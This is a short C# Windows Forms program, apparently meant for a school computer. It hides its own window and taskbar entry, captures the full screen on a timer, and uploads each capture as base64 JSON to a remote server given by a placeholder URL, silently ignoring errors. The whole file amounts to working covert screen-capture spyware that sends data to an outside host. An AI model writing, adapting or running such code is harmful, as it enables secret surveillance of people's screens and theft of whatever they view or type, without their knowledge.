using System;
using System.IO;
using System.Net;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;
using Newtonsoft.Json.Linq;
using System.Text;

namespace SchoolComputerUser
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            Opacity = 0;
            ShowInTaskbar = false;
        }

        private void GetPicture_Tick(object sender, EventArgs e)
        {
            try
            {
                Bitmap screen = CaptureImage();
                string base64 = ToBase64(screen);
                JObject upload = new JObject();
                upload.Add("Computer", base64);
                WebClient client = new WebClient();
                client.Headers.Add("Content-Type", "application/json");
                client.UploadString("JSON Server 1", "PUT", upload.ToString());
            }
            catch { }
        }
        private Bitmap CaptureImage()
        {
            Rectangle rectangle = Screen.PrimaryScreen.Bounds;
            int bpp = Screen.PrimaryScreen.BitsPerPixel;
            PixelFormat pixelFormat = PixelFormat.Format32bppArgb;
            if (bpp <= 16)
            {
                pixelFormat = PixelFormat.Format16bppRgb565;
            }
            else if (bpp == 24)
            {
                pixelFormat = PixelFormat.Format24bppRgb;
            }
            Bitmap bitmap = new Bitmap(rectangle.Width, rectangle.Height, pixelFormat);
            using (Graphics gp = Graphics.FromImage(bitmap))
            {
                gp.CopyFromScreen(rectangle.Left, rectangle.Top, 0, 0, rectangle.Size);
            }
            return bitmap;
        }
        private string ToBase64(Bitmap bitmap)
        {
            MemoryStream ms = new MemoryStream();
            bitmap.Save(ms, ImageFormat.Jpeg);
            return Convert.ToBase64String(ms.ToArray());
        }
    }
}
